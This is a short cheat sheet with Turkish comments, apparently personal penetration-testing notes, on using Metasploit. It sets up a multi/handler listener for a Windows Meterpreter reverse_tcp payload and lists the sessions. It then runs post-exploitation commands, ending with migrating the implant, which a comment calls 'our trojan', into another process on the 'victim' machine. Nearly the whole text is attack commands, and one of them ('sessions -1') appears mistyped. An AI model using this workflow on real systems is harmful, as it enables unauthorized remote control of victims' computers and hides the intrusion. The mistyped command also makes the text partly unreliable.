### Meterpreter

> msfconsole
> use exploit>multi>handler
> msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
> msf exploit(multi/handler) > show options
> msf exploit(multi/handler) > set LHOST 10.0.2.15
> msf exploit(multi/handler) > exploit
> msf exploit(multi/handler) > sessions -l
> msf exploit(multi/handler) > sessions -1
> meterpreter > background //geri gitmek için
> meterpreter > sysinfo // hedef sistem hakkında bilgi almak için
> meterpreter > help //kkurbana yapılabilecek saldırıları gösterir
> meterpreter > ps //hedef sistemde çalışan işlemleri (process) listelemek için
> meterpreter > migrate 2824 // mevcut Meterpreter oturumunu başka bir çalışan process içine taşır.Yani payload artık yeni process içinde çalışır. 2824 açık olan çalışan process içinde trojenimizin id numarası
